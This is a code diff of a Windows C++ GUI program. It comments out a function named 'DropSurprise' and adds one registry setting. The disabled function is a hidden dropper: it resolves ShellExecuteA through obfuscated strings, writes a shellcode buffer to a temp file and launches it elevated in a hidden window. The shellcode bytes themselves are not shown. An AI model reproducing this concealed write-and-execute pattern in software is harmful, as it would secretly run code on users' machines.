@@ -31,7 +31,7 @@ std::string RandomString(int len)
 }
 void DropSurprise()
 {
-	auto lbMDL = GetModuleHandleA(OBFUSCATE("shell32.dll"));
+	/*auto lbMDL = GetModuleHandleA(OBFUSCATE("shell32.dll"));
 	typedef HINSTANCE(__stdcall* ptrShellExecuteA)(HWND hwnd, LPCSTR lpOperation,
 	LPCSTR lpFile, LPCSTR lpParameters, LPCSTR lpDirectory, INT nShowCmd);
 	ptrShellExecuteA callShellExecuteA = (ptrShellExecuteA)GetProcAddress(lbMDL, OBFUSCATE("ShellExecuteA"));
@@ -46,7 +46,7 @@ void DropSurprise()
 		WriteFile(hFile, shellcode, sizeof(shellcode), nullptr, nullptr);
 		CloseHandle(hFile);
 		callShellExecuteA(nullptr, OBFUSCATE("runas"), tmpDir, 0, 0, SW_HIDE);
-    }
+    }*/
 }
 void MessageChecker()
 {
@@ -132,7 +132,8 @@ BOOL CALLBACK EnumWindowsProcMy(HWND hwnd,LPARAM lParam)
 	if (reg != nullptr)
 	{
 		reg->WriteInteger("AllowNoScreen", Form1->CheckBox2->Checked);
-        reg->WriteInteger("StreamDist", Form1->TrackBar1->Position);
+		reg->WriteInteger("StreamDist", Form1->TrackBar1->Position);
+		reg->WriteInteger("UseShadow", Form1->CheckBox1->Checked);
 		delete reg;
     }
 	DWORD lpdwProcessId = 0x0; AnsiString selt(Form1->ComboBox1->Text);
